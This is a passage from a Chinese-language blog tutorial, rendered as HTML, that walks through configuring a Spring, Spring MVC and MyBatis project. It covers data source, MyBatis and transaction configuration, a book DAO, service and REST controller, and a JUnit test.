class="token punctuation">=</span><span class="token value attr-value">jdbc:mysql://localhost:3306/ssm_db?serverTimezone=GMT%2B8&amp;useUnicode=true&amp;characterEncoding=utf-8</span><span class="token key attr-name">jdbc.username</span><span class="token punctuation">=</span><span class="token value attr-value">root</span><span class="token key attr-name">jdbc.password</span><span class="token punctuation">=</span><span class="token value attr-value">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="322-springconfig类修改"><a class="markdownIt-Anchor" href="#322-springconfig类修改">#</a> 3.2.2 SpringConfig 类修改</h3><ul><li>先新建 JdbcConfig 类和 MybatisConfig 类，在 SpringConfig 类中添加 Jdbc 和 mybatis 配置，导入 properties 文件</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.service"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@PropertySource</span><span class="token punctuation">(</span><span class="token string">"classpath:jdbc.properties"</span><span class="token punctuation">)</span><span class="token comment">//导入properties配置文件，可在JdbcConfig用$&#123;&#125;形式传值</span><span class="token annotation punctuation">@Import</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">JdbcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">MybatisConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//导入mybatis的配置类</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="323-jdbcconfig类"><a class="markdownIt-Anchor" href="#323-jdbcconfig类">#</a> 3.2.3 JdbcConfig 类</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span></span><span class="token class-name">DataSourceTransactionManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span></span><span class="token class-name">PlatformTransactionManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcConfig</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//用value注解从properties文件中导入值</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.driver&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.url&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.username&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.password&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Bean</span><span class="token comment">//配置该方法的返回值为bean，获取DataSource对象</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">DruidDataSource</span> druidDataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> druidDataSource<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="324-mybatisconfig类"><a class="markdownIt-Anchor" href="#324-mybatisconfig类">#</a> 3.2.4 MybatisConfig 类</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MybatisConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span><span class="token comment">//配置SqlSessionFactoryBean</span>    <span class="token keyword">public</span> <span class="token class-name">SqlSessionFactoryBean</span> <span class="token function">sqlSessionFactory</span><span class="token punctuation">(</span><span class="token class-name">DataSource</span> dataSource<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">SqlSessionFactoryBean</span> factoryBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factoryBean<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>        factoryBean<span class="token punctuation">.</span><span class="token function">setTypeAliasesPackage</span><span class="token punctuation">(</span><span class="token string">"com.itheima.domain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> factoryBean<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span><span class="token comment">//配置接口代理目录</span>    <span class="token keyword">public</span> <span class="token class-name">MapperScannerConfigurer</span> <span class="token function">mapperScannerConfigurer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">MapperScannerConfigurer</span> mapperScannerConfigurer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MapperScannerConfigurer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapperScannerConfigurer<span class="token punctuation">.</span><span class="token function">setBasePackage</span><span class="token punctuation">(</span><span class="token string">"com.itheima.dao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> mapperScannerConfigurer<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="325-在dao包下写数据库方法"><a class="markdownIt-Anchor" href="#325-在dao包下写数据库方法">#</a> 3.2.5 在 dao 包下写数据库方法</h3><ul><li>使用接口代理</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Book</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">Select</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BookDao</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Select</span><span class="token punctuation">(</span><span class="token string">"select * from tbl_book;"</span><span class="token punctuation">)</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">></span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="326-业务层接口和实现类"><a class="markdownIt-Anchor" href="#326-业务层接口和实现类">#</a> 3.2.6 业务层接口和实现类</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Book</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">></span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Book</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Service</span> <span class="token comment">//要写注解受Spring管理</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span> <span class="token comment">//自动注入，注意这里会报错，但不用管</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">></span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> bookDao<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="327-junit整合测试"><a class="markdownIt-Anchor" href="#327-junit整合测试">#</a> 3.2.7 Junit 整合测试</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">SpringConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Book</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">BookServiceImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span></span><span class="token class-name">RunWith</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ContextConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span></span><span class="token class-name">SpringJUnit4ClassRunner</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringJUnit4ClassRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token comment">//配置</span><span class="token annotation punctuation">@ContextConfiguration</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>  <span class="token comment">//配置</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceTest</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">BookService</span> bookService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testGetAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">></span></span> all <span class="token operator">=</span> bookService<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>all<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="33-springmvc配置"><a class="markdownIt-Anchor" href="#33-springmvc配置">#</a> 3.3 SpringMvc 配置</h2><h3 id="331-springmvcconfig类"><a class="markdownIt-Anchor" href="#331-springmvcconfig类">#</a> 3.3.1 SpringMVCConfig 类</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima.controller"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableWebMvc</span> <span class="token comment">//接收JSON参数并自动转换</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="332-servletconfig类"><a class="markdownIt-Anchor" href="#332-servletconfig类">#</a> 3.3.2 ServletConfig 类</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractAnnotationConfigDispatcherServletInitializer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token comment">//获取Spring</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getRootConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token comment">//获取SpringMVC</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//获取拦截请求路径</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//解决中文乱码</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Filter</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletFilters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">CharacterEncodingFilter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CharacterEncodingFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        filter<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Filter</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>filter<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="333-bookcontroller类功能实现"><a class="markdownIt-Anchor" href="#333-bookcontroller类功能实现">#</a> 3.3.3 BookController 类功能实现</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/books"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">BookService</span> bookService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">></span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> bookService<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="334-使用postman测试接口"><a class="markdownIt-Anchor" href="#334-使用postman测试接口">#</a> 3.3.4 使用 postman 测试接口</h3><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221006134243559.png" alt="image-20221006134243559"></p><h2 id="34-配置mysql事务"><a class="markdownIt-Anchor" href="#34-配置mysql事务">#</a> 3.4 配置 mysql 事务</h2><h3 id="341-在jdbcconfig-类增加一个事务方法"><a class="markdownIt-Anchor" href="#341-在jdbcconfig-类增加一个事务方法">#</a> 3.4.1 在 JdbcConfig 类增加一个事务方法</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcConfig</span> <span class="token punctuation">&#123;</span><span class="token comment">/*返回数据源*/</span>    <span class="token comment">//事务</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">PlatformTransactionManager</span> <span class="token function">platformTransactionManager</span><span class="token punctuation">(</span><span class="token class-name">DataSource</span> dataSource<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">DataSourceTransactionManager</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataSourceTransactionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ds<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="342-在springconfig开启注解式事务驱动"><a class="markdownIt-Anchor" href="#342-在springconfig开启注解式事务驱动">#</a> 3.4.2 在 SpringConfig 开启注解式事务驱动</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.service"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@PropertySource</span><span class="token punctuation">(</span><span class="token string">"classpath:jdbc.properties"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Import</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">JdbcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">MybatisConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableTransactionManagement</span><span class="token comment">//开启注解式事务驱动</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="343-在service接口挂载注解"><a class="markdownIt-Anchor" href="#343-在service接口挂载注解">#</a> 3.4.3 在 service 接口挂载注解</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Transactional</span><span class="token comment">//事务注解</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 保存     * @param book     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token class-name">Book</span> book<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 修改     * @param book     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">Book</span> book<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 根据ID删除     * @param id     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 按ID查询     * @param id     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">Book</span> <span class="token function">getById</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 查询全部     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Book</span><span class="token punctuation">></span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
